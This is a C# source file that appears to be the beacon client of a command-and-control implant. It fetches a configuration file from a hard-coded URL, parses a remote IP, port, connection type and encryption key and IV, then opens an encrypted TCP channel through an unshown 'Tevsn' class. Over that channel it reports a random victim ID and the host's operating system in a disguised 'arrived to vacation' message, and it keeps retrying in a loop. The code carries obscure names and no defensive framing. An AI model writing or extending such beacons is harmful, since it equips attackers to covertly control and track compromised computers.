using System.Security.Cryptography;
using System.Globalization;
//imports for http get
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using tevsn;
using System.Net;

namespace cevsn
{
    public class Cevsn
    {
        public static String URL = "http://127.0.0.1:8082/";
        public static String UUID = Guid.NewGuid().ToString();
        public volatile static byte[] KEY = new byte[256];
        public volatile static byte[] IV = new byte[16];
        public volatile static String IP = "";
        public volatile static int PORT = 0;
        public volatile static string Type = "";
        public static readonly HttpClient client = new HttpClient();
        public volatile static Tevsn? tevsn = null;
        public volatile static Boolean IsConnected = false;
        public volatile static Boolean Running = false;
        public volatile static Boolean first = false;
        public volatile static int counter = 0;
        public volatile static Boolean gotHostInformation = false;

        public static async Task Main(string[] args)
        {
            gotHostInformation = false;
            Running = true;

            await Task.Factory.StartNew(() => 
            {
                while(Running)
                {
                    while(gotHostInformation == false)
                    {
                        string cont = getContent();
                        parseHostInformation(cont);
                        Thread.Sleep(1000);
                    }
                    while(gotHostInformation)
                    {
                        if(counter > 5)
                        {
                            gotHostInformation = false;
                            counter = 0;
                        }
                        if(Type.Equals("TCP"))
                        {
                            Console.Write("in tcp");
                            tevsn = CreateTevsn(IP, PORT, KEY, IV);
                            if(tevsn.Connect())
                            {
                                Console.Write("connected");
                                IsConnected = tevsn.IsConnected();
                                while(IsConnected)
                                {
                                    if(!first)
                                    {
                                        tevsn.Send(UUID+ "just arrived to vacation on +" + getOsName());
                                        tevsn.Receive();
                                        IsConnected = tevsn.IsConnected();
                                        first = true;
                                        Thread.Sleep(1000);
                                    }
                                    Thread.Sleep(1000);
                                }
                            }
                        }
                        counter++;
                        Thread.Sleep(1000);

                    }
                }

            });
            
        }

        //create getOsName method
        public static string getOsName()
        {
            string os = "";
            switch (Environment.OSVersion.Platform)
            {
                case PlatformID.Win32NT:
                    os = "Windows";
                    break;
                case PlatformID.Unix:
                    os = "Linux";
                    break;
                case PlatformID.MacOSX:
                    os = "MacOSX";
                    break;
                default:
                    os = "Unknown";
                    break;
            }
            return os;
        }

        static String getContent()
        {
            Task<string> response = client.GetStringAsync(URL + "initial.txt");
            Console.Write(response.Result.ToString() + "\n");
            return response.Result.ToString();
        }

        public static void parseHostInformation(string content) {
            if(content is not null)
            {
                string[] lines = content.Split(';');
                IP = lines[0];
                PORT = Int32.Parse(lines[1]);
                byte[] typeTmp = Convert.FromBase64String(lines[2]);
                Type = System.Text.Encoding.ASCII.GetString(typeTmp);
                KEY = Convert.FromBase64String(lines[3]);
                IV = Convert.FromBase64String(lines[4]);
                gotHostInformation = true;
            }
        }

        public static Tevsn CreateTevsn(string ip, int port, byte[] key, byte[] iv)
        {
            return new Tevsn(ip, port, key, iv);
        }
    }
}